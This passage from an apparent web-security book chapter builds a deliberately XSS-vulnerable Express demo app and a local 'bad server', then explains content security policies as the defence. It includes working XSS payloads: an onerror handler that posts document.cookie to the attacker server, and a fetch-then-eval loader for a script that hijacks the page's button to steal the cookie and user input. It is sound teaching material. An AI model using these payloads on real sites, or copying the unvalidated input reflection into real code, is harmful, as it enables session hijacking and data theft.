<p class="normal"><span class="kobospan" id="kobo.533.1">The use of content security policies is intended to prevent </span><strong class="screentext"><span class="kobospan" id="kobo.534.1">cross-site scripting</span></strong><span class="kobospan" id="kobo.535.1"> (</span><strong class="screentext"><span class="kobospan" id="kobo.536.1">XSS</span></strong><span class="kobospan" id="kobo.537.1">) attacks. </span><span class="kobospan" id="kobo.537.2">There are many variations of XSS attacks, but they all involve injecting malicious content or code into the content displayed by the browser to perform a task not intended by the application developers – typically something that deceives the user or steals sensitive data.</span></p>
<p class="normal"><span class="kobospan" id="kobo.538.1">One common cause of XSS attacks arises when an application accepts input from one user that is subsequently incorporated into the content presented to other users. </span><span class="kobospan" id="kobo.538.2">If an application accepts user reviews that are displayed alongside products, for example, an attacker could craft a review that browsers will interpret as HTML or JavaScript content when the product page is displayed.</span></p>
<p class="normal"><span class="kobospan" id="kobo.539.1">The best place to start is with a demonstration of the problem, which requires some changes to the example application. </span><span class="kobospan" id="kobo.539.2">The first change is to add an </span><code class="inlinecode"><span class="kobospan" id="kobo.540.1">input</span></code><span class="kobospan" id="kobo.541.1"> element to the HTML document displayed by the browser, which will allow the user to enter data that will later be displayed by the browser, as shown in </span><em class="italic"><span class="kobospan" id="kobo.542.1">Listing 7.23</span></em><span class="kobospan" id="kobo.543.1">.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.544.1">Listing 7.23: Adding an input element in the index.html file in the static folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.545.1">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;script src="/bundle.js"&gt;&lt;/script&gt;
        &lt;link href="css/bootstrap.min.css" rel="stylesheet" /&gt;
    &lt;/head&gt;
    &lt;body&gt;
       </span><strong class="screentext"><span class="kobospan" id="kobo.546.1"> &lt;div class="m-2"&gt;</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.547.1">            &lt;</span></strong><strong class="screentext"><span class="kobospan" id="kobo.548.1">label class="form-label"&gt;Message:&lt;/label&gt;</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.549.1">            &lt;input id="input" class="</span></strong><strong class="screentext"><span class="kobospan" id="kobo.550.1">form-control" /&gt;</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.551.1">        &lt;/div&gt;</span></strong><span class="kobospan" id="kobo.552.1">
        &lt;button id="btn" class="btn btn-primary m-2"&gt;Send Message&lt;/button&gt;
        &lt;table class="table table-striped"&gt;
            &lt;tbody&gt;
                &lt;tr&gt;&lt;th&gt;Status&lt;/th&gt;&lt;td id="msg"&gt;&lt;/td&gt;&lt;/tr&gt;
                &lt;tr&gt;&lt;th&gt;Response&lt;/th&gt;&lt;td id="body"&gt;&lt;/td&gt;&lt;/tr&gt;
            &lt;/tbody&gt;
       &lt;/table&gt;
    &lt;/body&gt;
&lt;/html&gt;
</span></code></pre>
<p class="normal"><em class="italic"><span class="kobospan" id="kobo.553.1">Listing 7.24</span></em><span class="kobospan" id="kobo.554.1"> updates </span><a id="_idIndexMarker391" class="calibre3"/><span class="kobospan" id="kobo.555.1">the client-side JavaScript code so that it sends the contents of the </span><code class="inlinecode"><span class="kobospan" id="kobo.556.1">input</span></code><span class="kobospan" id="kobo.557.1"> element added in </span><em class="italic"><span class="kobospan" id="kobo.558.1">Listing 7.23</span></em><span class="kobospan" id="kobo.559.1"> to the server.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.560.1">Listing 7.24: Updating the client-side code in the client.js file in the static folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.561.1">document.addEventListener('DOMContentLoaded', function() {
    document.getElementById("btn").addEventListener("click", sendReq);
});
const requestUrl = "/read";
sendReq = async () =&gt; {
    </span><strong class="screentext"><span class="kobospan" id="kobo.562.1">// let payload = document.getElementById("input").value;</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.563.1">    // for (let i = 0; i &lt; 5; i++) {</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.564.1">    //     payload.push({ id: i, message: `Payload Message: ${i}\n`});</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.565.1">    // }</span></strong><span class="kobospan" id="kobo.566.1">
    const response = await fetch(requestUrl, {
       </span><strong class="screentext"><span class="kobospan" id="kobo.567.1"> method: "POST", body</span></strong><strong class="screentext"><span class="kobospan" id="kobo.568.1">: document.getElementById("input").value,</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.569.1">  // headers: {</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.570.1">        //     "Content-Type": "application/json"</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.571.1">        // }</span></strong><span class="kobospan" id="kobo.572.1">
    })
    document.getElementById("msg").textContent = response.statusText;
    document.getElementById("body").innerHTML = await response.text();
}
</span></code></pre>
<p class="normal"><em class="italic"><span class="kobospan" id="kobo.573.1">Listing 7.25</span></em><span class="kobospan" id="kobo.574.1"> updates </span><a id="_idIndexMarker392" class="calibre3"/><span class="kobospan" id="kobo.575.1">the handler that receives data from the browser so that it pipes the data from the request to the response. </span><span class="kobospan" id="kobo.575.2">This means that whatever is entered into the </span><code class="inlinecode"><span class="kobospan" id="kobo.576.1">input</span></code><span class="kobospan" id="kobo.577.1"> element will be sent to the server and then piped back to the browser, where it will be displayed to the user.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.578.1">Listing 7.25: Piping data in the readHandler.ts file in the src folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.579.1">import { Request, Response } from "express";
export const readHandler = (req: Request, resp: Response) =&gt; {   
    </span><strong class="screentext"><span class="kobospan" id="kobo.580.1">// resp.json({</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.581.1">    //     message: "Hello, World"</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.582.1">    // });</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.583.1">    resp.cookie("sessionID", "mysecretcode");</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.584.1">    req.pipe(resp);</span></strong><span class="kobospan" id="kobo.585.1">
}
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.586.1">The handler also sets a cookie in the response. </span><span class="kobospan" id="kobo.586.2">One of the uses of XSS attacks is to steal session credentials so that the attacker can impersonate a legitimate user. </span><span class="kobospan" id="kobo.586.3">The cookie set by the code in </span><em class="italic"><span class="kobospan" id="kobo.587.1">Listing 7.25</span></em><span class="kobospan" id="kobo.588.1"> is a placeholder for data that will be stolen.</span></p>
<div class="packt_tip">
<p class="normal"><strong class="screentext"><span class="kobospan" id="kobo.589.1">Tip</span></strong></p>
<p class="normal"><span class="kobospan" id="kobo.590.1">See Part 2 of this book for details on how to create and use real sessions.</span></p>
</div>
<p class="normal"><span class="kobospan" id="kobo.591.1">The changes from </span><em class="italic"><span class="kobospan" id="kobo.592.1">Listing 7.23</span></em><span class="kobospan" id="kobo.593.1"> to </span><em class="italic"><span class="kobospan" id="kobo.594.1">Listing 7.25</span></em><span class="kobospan" id="kobo.595.1"> deliberately create a situation where input provided by the user is used without any form of validation. </span><span class="kobospan" id="kobo.595.2">This sort of problem is easy to spot in a simple example but can be much more difficult to identify in a real project, especially one where features are added over time. </span><span class="kobospan" id="kobo.595.3">This is such a common problem that XSS is one of the top 10 application security risks identified by the </span><strong class="screentext"><span class="kobospan" id="kobo.596.1">Open Worldwide Application Security Project</span></strong><span class="kobospan" id="kobo.597.1"> (</span><strong class="screentext"><span class="kobospan" id="kobo.598.1">OWASP</span></strong><span class="kobospan" id="kobo.599.1">) and </span><a id="_idIndexMarker393" class="calibre3"/><span class="kobospan" id="kobo.600.1">has been for some years (see </span><a href="https://owasp.org/www-project-top-ten" class="calibre3"><span class="calibre3"><span class="kobospan" id="kobo.601.1">https://owasp.org/www-project-top-ten</span></span></a><span class="kobospan" id="kobo.602.1"> for the complete list).</span></p>
<h2 class="heading1" id="_idParaDest-143"><span class="kobospan" id="kobo.603.1">Injecting malicious content</span></h2>
<p class="normal1"><span class="kobospan" id="kobo.604.1">To </span><a id="_idIndexMarker394" class="calibre3"/><span class="kobospan" id="kobo.605.1">complete the preparations, add a file named </span><code class="inlinecode"><span class="kobospan" id="kobo.606.1">badServer.mjs</span></code><span class="kobospan" id="kobo.607.1"> to the </span><code class="inlinecode"><span class="kobospan" id="kobo.608.1">webapp</span></code><span class="kobospan" id="kobo.609.1"> folder with the content shown in </span><em class="italic"><span class="kobospan" id="kobo.610.1">Listing 7.26</span></em><span class="kobospan" id="kobo.611.1">. </span><span class="kobospan" id="kobo.611.2">This is a “bad” server, which will serve content and receive requests on behalf of malicious code.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.612.1">Listing 7.26: Creating a server in the badServer.mjs file in the webapp folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.613.1">import { createServer } from "http";
import express from "express";
import cors from "cors";
createServer(express().use(cors()).use(express.static("static"))
    .post("*", (req, resp) =&gt; {
        req.on("data", (data) =&gt; { console.log(data.toString()) });
        req.on("end", () =&gt; resp.end());
    })).listen(9999,
        () =&gt; console.log(`Bad Server listening on port 9999`));
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.614.1">For the sake of simplicity, this file contains JavaScript code so that it can be executed without needing the TypeScript compiler. </span><span class="kobospan" id="kobo.614.2">The code is expressed for brevity, rather than readability, and uses the Express features for serving static content and the router to receive POST requests.</span></p>
<p class="normal"><span class="kobospan" id="kobo.615.1">Open a new command prompt, navigate to the </span><code class="inlinecode"><span class="kobospan" id="kobo.616.1">webapp</span></code><span class="kobospan" id="kobo.617.1"> folder, and run the command shown in </span><em class="italic"><span class="kobospan" id="kobo.618.1">Listing 7.27</span></em><span class="kobospan" id="kobo.619.1"> to start the server.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.620.1">Listing 7.27: Starting the bad web server</span></p>
<pre class="programlisting1"><code class="hljs-con"><span class="kobospan" id="kobo.621.1">node badServer.mjs
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.622.1">Having prepared the example application and the bad server, the process of subverting the application requires entering carefully crafted strings, intended to get the browser to load content or execute JavaScript that isn’t part of the application.</span></p>
<div class="packt_tip">
<p class="normal"><strong class="screentext"><span class="kobospan" id="kobo.623.1">Note</span></strong></p>
<p class="normal"><span class="kobospan" id="kobo.624.1">This section shows simple – and related – exploits that take advantage of a defect that I have knowingly created, which helps me describe useful features but doesn’t cover the full spectrum of XSS issues. </span><span class="kobospan" id="kobo.624.2">You can find an excellent set of XSS tests to apply at </span><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" class="calibre3"><span class="calibre3"><span class="kobospan" id="kobo.625.1">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</span></span></a><span class="kobospan" id="kobo.626.1">.</span></p>
</div>
<p class="normal"><span class="kobospan" id="kobo.627.1">Enter the</span><a id="_idIndexMarker395" class="calibre3"/><span class="kobospan" id="kobo.628.1"> text shown in </span><em class="italic"><span class="kobospan" id="kobo.629.1">Listing 7.28</span></em><span class="kobospan" id="kobo.630.1"> into the </span><code class="inlinecode"><span class="kobospan" id="kobo.631.1">input</span></code><span class="kobospan" id="kobo.632.1"> element and click the </span><strong class="screentext"><span class="kobospan" id="kobo.633.1">Send Message</span></strong><span class="kobospan" id="kobo.634.1"> button. </span><span class="kobospan" id="kobo.634.2">Pay close attention to the quote characters when entering the text into the </span><code class="inlinecode"><span class="kobospan" id="kobo.635.1">input</span></code><span class="kobospan" id="kobo.636.1"> element. </span><span class="kobospan" id="kobo.636.2">It is important to use double and single quotes as they are shown, otherwise, the browser won’t be able to parse the string.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.637.1">Listing 7.28: Requesting an image</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.638.1">&lt;img src="http://localhost:9999/city.png" onclick="location='http://packt.com'"&gt;
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.639.1">The client-side JavaScript code adds the response from the server to the HTML document displayed to the user, which causes the browser to request an image file from the bad server. </span><span class="kobospan" id="kobo.639.2">Clicking on the image causes the browser to navigate away from the application, as shown in </span><em class="italic"><span class="kobospan" id="kobo.640.1">Figure 7.9</span></em><span class="kobospan" id="kobo.641.1">.</span></p>
<figure class="mediaobject"><span class="kobospan" id="kobo.642.1"><img alt="" src="../Images/B21959_07_09.png" class="calibre7"/></span></figure>
<p class="packt_figref"><span class="kobospan" id="kobo.643.1">Figure 7.9: Loading an image with a click redirection</span></p>
<p class="normal"><span class="kobospan" id="kobo.644.1">It isn’t just </span><a id="_idIndexMarker396" class="calibre3"/><span class="kobospan" id="kobo.645.1">images that can be added to the document. </span><span class="kobospan" id="kobo.645.2">Enter the text shown in </span><em class="italic"><span class="kobospan" id="kobo.646.1">Listing 7.29</span></em><span class="kobospan" id="kobo.647.1"> into the </span><code class="inlinecode"><span class="kobospan" id="kobo.648.1">input</span></code><span class="kobospan" id="kobo.649.1"> element and click the </span><strong class="screentext"><span class="kobospan" id="kobo.650.1">Send Message</span></strong><span class="kobospan" id="kobo.651.1"> button, which will add a button to the document displayed by the user. </span><span class="kobospan" id="kobo.651.2">Once again, pay close attention to the quote characters.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.652.1">Listing 7.29: Creating a button</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.653.1">&lt;button class="btn btn-danger" onclick="location='http://packt.com'"&gt;Click&lt;/button&gt;
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.654.1">The button that is created takes advantage of the CSS stylesheets that are used by the application, giving the new element an appearance that is consistent with the other button displayed by the browser, as shown in </span><em class="italic"><span class="kobospan" id="kobo.655.1">Figure 7.11</span></em><span class="kobospan" id="kobo.656.1">.</span></p>
<figure class="mediaobject"><span class="kobospan" id="kobo.657.1"><img alt="" src="../Images/B21959_07_10.png" class="calibre7"/></span></figure>
<p class="packt_figref"><span class="kobospan" id="kobo.658.1">Figure 7.11: Adding an element</span></p>
<p class="normal"><span class="kobospan" id="kobo.659.1">Injected </span><a id="_idIndexMarker397" class="calibre3"/><span class="kobospan" id="kobo.660.1">code can also be used to steal sensitive data. </span><span class="kobospan" id="kobo.660.2">Enter the text shown in </span><em class="italic"><span class="kobospan" id="kobo.661.1">Listing 7.30</span></em><span class="kobospan" id="kobo.662.1"> into the </span><code class="inlinecode"><span class="kobospan" id="kobo.663.1">input</span></code><span class="kobospan" id="kobo.664.1"> element and click the </span><strong class="screentext"><span class="kobospan" id="kobo.665.1">Send Message</span></strong><span class="kobospan" id="kobo.666.1"> button, once again paying close attention to the quote characters and entering the text as a single line.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.667.1">Listing 7.30: Stealing data</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.668.1">&lt;img src="nope" onerror="fetch('http://localhost:9999', { method: 'POST', body: document.cookie})"&gt;
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.669.1">This </span><code class="inlinecode"><span class="kobospan" id="kobo.670.1">img</span></code><span class="kobospan" id="kobo.671.1"> element specifies a file that doesn’t exist. </span><span class="kobospan" id="kobo.671.2">The browser will emit the </span><code class="inlinecode"><span class="kobospan" id="kobo.672.1">error</span></code><span class="kobospan" id="kobo.673.1"> event when it fails to load the file, which executes the fragment of JavaScript code assigned to the </span><code class="inlinecode"><span class="kobospan" id="kobo.674.1">onerror</span></code><span class="kobospan" id="kobo.675.1"> attribute in </span><em class="italic"><span class="kobospan" id="kobo.676.1">Listing 7.30</span></em><span class="kobospan" id="kobo.677.1">. </span><span class="kobospan" id="kobo.677.2">The code uses the browser’s Fetch API to send an HTTP POST request to the bad server, including the sensitive cookie data as the request body. </span><span class="kobospan" id="kobo.677.3">If you examine the output from the command prompt running the bad server, you will see the following message, showing the data that the bad server received:</span></p>
<pre class="programlisting1"><code class="hljs-con"><span class="kobospan" id="kobo.678.1">Bad Server listening on port 9999
</span><strong class="screentext"><span class="kobospan" id="kobo.679.1">sessionID=mysecretcode</span></strong>
</code></pre>
<p class="normal"><span class="kobospan" id="kobo.680.1">No user </span><a id="_idIndexMarker398" class="calibre3"/><span class="kobospan" id="kobo.681.1">action was needed to trigger this behavior and the data is sent as soon as the browser tries – and fails – to load the image. </span><span class="kobospan" id="kobo.681.2">For the final example, add a file named </span><code class="inlinecode"><span class="kobospan" id="kobo.682.1">bad.js</span></code><span class="kobospan" id="kobo.683.1"> to the </span><code class="inlinecode"><span class="kobospan" id="kobo.684.1">static</span></code><span class="kobospan" id="kobo.685.1"> folder with the content shown in </span><em class="italic"><span class="kobospan" id="kobo.686.1">Listing 7.31</span></em><span class="kobospan" id="kobo.687.1">.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.688.1">Listing 7.31: The contents of the bad.js file in the static folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.689.1">const input = document.getElementById("input");
const button = document.getElementById("btn");
const newButton = button.cloneNode();
button.parentElement.replaceChild(newButton, button);
newButton.textContent = "Bad Button";
newButton.addEventListener("click", () =&gt; {
    sendReq();
    fetch("http://localhost:9999", {
        method: "POST",
        body: JSON.stringify({
            cookie: document.cookie,
            input: input.value
        })
    });
});
input.value = "";
input.placeholder = "Enter something secret here";
document.getElementById("body").innerHTML = "";
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.690.1">This code locates the </span><code class="inlinecode"><span class="kobospan" id="kobo.691.1">button</span></code><span class="kobospan" id="kobo.692.1"> element in the HTML document and replaces it with one that sends the sensitive data to the bad server. </span><span class="kobospan" id="kobo.692.2">To get the browser to load this file, enter the text shown in </span><em class="italic"><span class="kobospan" id="kobo.693.1">Listing 7.32</span></em><span class="kobospan" id="kobo.694.1"> in the </span><code class="inlinecode"><span class="kobospan" id="kobo.695.1">input</span></code><span class="kobospan" id="kobo.696.1"> element and click the </span><strong class="screentext"><span class="kobospan" id="kobo.697.1">Send Message</span></strong><span class="kobospan" id="kobo.698.1"> button. </span><span class="kobospan" id="kobo.698.2">This is the most complex example in this section and particular care must be taken to enter it correctly and as a single line.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.699.1">Listing 7.32: Loading a JavaScript file</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.700.1">&lt;img src="nope" onerror="fetch('http://localhost:9999/bad.js').then(r =&gt; r.text()).then(t =&gt; eval(t))"&gt;
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.701.1">The JavaScript code uses the browser’s Fetch API to request the </span><code class="inlinecode"><span class="kobospan" id="kobo.702.1">bad.js</span></code><span class="kobospan" id="kobo.703.1"> file from the bad </span><a id="_idIndexMarker399" class="calibre3"/><span class="kobospan" id="kobo.704.1">HTTP server and then uses the JavaScript </span><code class="inlinecode"><span class="kobospan" id="kobo.705.1">eval</span></code><span class="kobospan" id="kobo.706.1"> function to execute its contents. </span><span class="kobospan" id="kobo.706.2">The </span><code class="inlinecode"><span class="kobospan" id="kobo.707.1">eval</span></code><span class="kobospan" id="kobo.708.1"> function will treat any string as JavaScript code and, as a consequence, can present a risk whenever it is used. </span><span class="kobospan" id="kobo.708.2">When the browser executes the JavaScript code, the existing button is replaced with one that sends the sensitive cookie data to the bad server, as shown in </span><em class="italic"><span class="kobospan" id="kobo.709.1">Figure 7.12</span></em><span class="kobospan" id="kobo.710.1">. </span><span class="kobospan" id="kobo.710.2">(The button text is also changed just to emphasize the change.)</span></p>
<figure class="mediaobject"><span class="kobospan" id="kobo.711.1"><img alt="" src="../Images/B21959_07_11.png" class="calibre7"/></span></figure>
<p class="packt_figref"><span class="kobospan" id="kobo.712.1">Figure 7.12: Replacing a button</span></p>
<p class="normal"><span class="kobospan" id="kobo.713.1">When you click the button, the bad HTTP server will display a console message that shows the cookie value and whatever you entered into the </span><code class="inlinecode"><span class="kobospan" id="kobo.714.1">input</span></code><span class="kobospan" id="kobo.715.1"> element before clicking the button, like this:</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.716.1">...
</span><span class="kobospan" id="kobo.716.2">{"cookie":"sessionID=mysecretcode","input":"myothersecret"}
...
</span></code></pre>
<div class="note">
<p class="normal"><strong class="screentext"><span class="kobospan" id="kobo.717.1">Why Not Just inject a script element?</span></strong></p>
<p class="normal"><span class="kobospan" id="kobo.718.1">XSS attacks have been such a problem for so long that some protections against them are codified into the HTML specification. </span><span class="kobospan" id="kobo.718.2">For example, the client-side code in the example application uses the </span><code class="inlinecode"><span class="kobospan" id="kobo.719.1">innerHTML</span></code><span class="kobospan" id="kobo.720.1"> property to display the response it receives from the backend server, like this:</span></p>
<pre class="programlisting2"><code class="hljs-code"><code class="inlinecode2"><span class="kobospan" id="kobo.721.1">...</span></code>
<code class="inlinecode2"><span class="kobospan" id="kobo.722.1">document.getElementById("body").innerHTML = await response.text();</span></code>
<code class="inlinecode2"><span class="kobospan" id="kobo.723.1">...</span></code>
</code></pre>
<p class="normal"><span class="kobospan" id="kobo.724.1">The HTML specification instructs browsers not to execute </span><code class="inlinecode"><span class="kobospan" id="kobo.725.1">script</span></code><span class="kobospan" id="kobo.726.1"> elements assigned to the </span><code class="inlinecode"><span class="kobospan" id="kobo.727.1">innerHTML</span></code><span class="kobospan" id="kobo.728.1"> property, which means that using JavaScript code directly won’t work, but using event handlers will. </span><span class="kobospan" id="kobo.728.2">This limitation arises because of the way the example app has evolved from chapter to chapter, and you must not assume that all applications will be similarly restricted.</span></p>
</div>
<h2 class="heading1" id="_idParaDest-144"><span class="kobospan" id="kobo.729.1">Defining a content security policy</span></h2>
<p class="normal1"><span class="kobospan" id="kobo.730.1">A </span><a id="_idIndexMarker400" class="calibre3"/><span class="kobospan" id="kobo.731.1">content security policy tells the browser how the client-side application is expected to behave and is set using the </span><code class="inlinecode"><span class="kobospan" id="kobo.732.1">Content-Security-Policy</span></code><span class="kobospan" id="kobo.733.1"> header, as shown in </span><em class="italic"><span class="kobospan" id="kobo.734.1">Listing 7.33</span></em><span class="kobospan" id="kobo.735.1">. </span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.736.1">Listing 7.33: Setting a content security policy in the server.ts file in the src folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.737.1">import { createServer } from "http";
import express, {Express } from "express";
import { readHandler } from "./readHandler";
import cors from "cors";
import httpProxy from "http-proxy";
const port = 5000;
const expressApp: Express = express();
const proxy = httpProxy.createProxyServer({
    target: "http://localhost:5100", ws: true
});
</span><strong class="screentext"><span class="kobospan" id="kobo.738.1">expressApp.use((</span></strong><strong class="screentext"><span class="kobospan" id="kobo.739.1">req, resp, next) =&gt; {</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.740.1">    resp.setHeader("Content-Security-Policy", "img-src 'self'");</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.741.1">    next();</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.742.1">})</span></strong><span class="kobospan" id="kobo.743.1">
expressApp.use(cors({
    origin: "http://localhost:5100"
}));
expressApp.use(express.json());
expressApp.post("/read", readHandler);
expressApp.use(express.static("static"));
expressApp.use(express.static("node_modules/bootstrap/dist"));
//expressApp.use(express.static("dist/client"));
expressApp.use((req, resp) =&gt; proxy.web(req, resp));
const server = createServer(expressApp);
server.on('upgrade', (req, socket, head) =&gt; proxy.ws(req, socket, head));
server.listen(port,
    () =&gt; console.log(`HTTP Server listening on port ${port}`));
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.744.1">The </span><a id="_idIndexMarker401" class="calibre3"/><span class="kobospan" id="kobo.745.1">CSP header should be applied to every response, and so the listing uses the Express </span><code class="inlinecode"><span class="kobospan" id="kobo.746.1">use</span></code><span class="kobospan" id="kobo.747.1"> method to set up a middleware component, which is like a regular request handler but receives an additional argument that is used to pass the request along for further processing.</span></p>
<p class="normal"><span class="kobospan" id="kobo.748.1">The header value is the policy for the application and consists of one or more </span><em class="italic"><span class="kobospan" id="kobo.749.1">policy directives</span></em><span class="kobospan" id="kobo.750.1"> and values. </span><span class="kobospan" id="kobo.750.2">The header in </span><em class="italic"><span class="kobospan" id="kobo.751.1">Listing 7.33</span></em><span class="kobospan" id="kobo.752.1"> contains one policy directive, which is </span><code class="inlinecode"><span class="kobospan" id="kobo.753.1">img-src</span></code><span class="kobospan" id="kobo.754.1"> and whose value is </span><code class="inlinecode"><span class="kobospan" id="kobo.755.1">self</span></code><span class="kobospan" id="kobo.756.1">:</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.757.1">...
</span><span class="kobospan" id="kobo.757.2">resp.setHeader("Content-Security-Policy", </span><strong class="screentext"><span class="kobospan" id="kobo.758.1">"img-src 'self'"</span></strong><span class="kobospan" id="kobo.759.1">);
...
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.760.1">The CSP specification defines a range of policies that specify the locations from which different content can be loaded. </span><em class="italic"><span class="kobospan" id="kobo.761.1">Table 7.4</span></em><span class="kobospan" id="kobo.762.1"> describes the most useful policy directives, and a full list can be found at </span><code class="inlinecode"><span class="kobospan" id="kobo.763.1">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</span></code><span class="kobospan" id="kobo.764.1">. </span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.765.1">Table 7.4: Useful CSP directives</span></p>
<table class="table-container" id="table004-3">
<tbody class="calibre8">
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.766.1">Policy Directive</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.767.1">Description</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<pre class="programlisting2"><code class="hljs"><code class="inlinecode1"><span class="kobospan2" id="kobo.768.1">default-src</span></code>
</code></pre>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.769.1">This directive sets the default policy for all directives.</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<pre class="programlisting2"><code class="hljs"><code class="inlinecode1"><span class="kobospan2" id="kobo.770.1">connect-src</span></code>
</code></pre>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.771.1">This directive specifies the URLs that can be requested using JavaScript code.</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<pre class="programlisting2"><code class="hljs"><code class="inlinecode1"><span class="kobospan2" id="kobo.772.1">img-src</span></code>
</code></pre>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.773.1">This directive specifies the sources from which images can be loaded.</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<pre class="programlisting2"><code class="hljs"><code class="inlinecode1"><span class="kobospan2" id="kobo.774.1">script-src</span></code>
</code></pre>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.775.1">This directive specifies the sources from which JavaScript files can be loaded.</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<pre class="programlisting2"><code class="hljs"><code class="inlinecode1"><span class="kobospan2" id="kobo.776.1">script-src-attr</span></code>
</code></pre>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.777.1">This directive specifies the valid sources for inline event handlers.</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<pre class="programlisting2"><code class="hljs"><code class="inlinecode1"><span class="kobospan2" id="kobo.778.1">form-action</span></code>
</code></pre>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.779.1">This directive specifies the URLs to which form data can be sent.</span></p>
</td>
</tr>
</tbody>
</table>
<p class="normal"><span class="kobospan" id="kobo.780.1">The values</span><a id="_idIndexMarker402" class="calibre3"/><span class="kobospan" id="kobo.781.1"> for a policy can be specified using URLs with wildcards (such as </span><code class="inlinecode"><span class="kobospan" id="kobo.782.1">http://*.acme.com</span></code><span class="kobospan" id="kobo.783.1">) or a scheme (such as </span><code class="inlinecode"><span class="kobospan" id="kobo.784.1">http:</span></code><span class="kobospan" id="kobo.785.1"> to allow all HTTP requests or </span><code class="inlinecode"><span class="kobospan" id="kobo.786.1">https:</span></code><span class="kobospan" id="kobo.787.1"> for all HTTPS requests). </span><span class="kobospan" id="kobo.787.2">There are also special values such as </span><code class="inlinecode"><span class="kobospan" id="kobo.788.1">'none'</span></code><span class="kobospan" id="kobo.789.1">, which blocks all URLs, and </span><code class="inlinecode"><span class="kobospan" id="kobo.790.1">'self'</span></code><span class="kobospan" id="kobo.791.1">, which limits requests to the origin from which the document was loaded. </span><span class="kobospan" id="kobo.791.2">(The single quotes must be specified for these special values, which is why the policy defined in </span><em class="italic"><span class="kobospan" id="kobo.792.1">Listing 7.33</span></em><span class="kobospan" id="kobo.793.1"> looks oddly quoted.)</span></p>
<p class="normal"><span class="kobospan" id="kobo.794.1">The policy defined in </span><em class="italic"><span class="kobospan" id="kobo.795.1">Listing 7.33</span></em><span class="kobospan" id="kobo.796.1"> tells the browser that images can only be requested from the same origin as the HTML document. </span><span class="kobospan" id="kobo.796.2">To see the effect, reload the browser, enter the text from </span><em class="italic"><span class="kobospan" id="kobo.797.1">Listing 7.28</span></em><span class="kobospan" id="kobo.798.1">, and click the </span><strong class="screentext"><span class="kobospan" id="kobo.799.1">Send Message</span></strong><span class="kobospan" id="kobo.800.1"> button. </span><span class="kobospan" id="kobo.800.2">(You must reload to ensure that the header defined in </span><em class="italic"><span class="kobospan" id="kobo.801.1">Listing 7.33</span></em><span class="kobospan" id="kobo.802.1"> is sent to the browser.)</span></p>
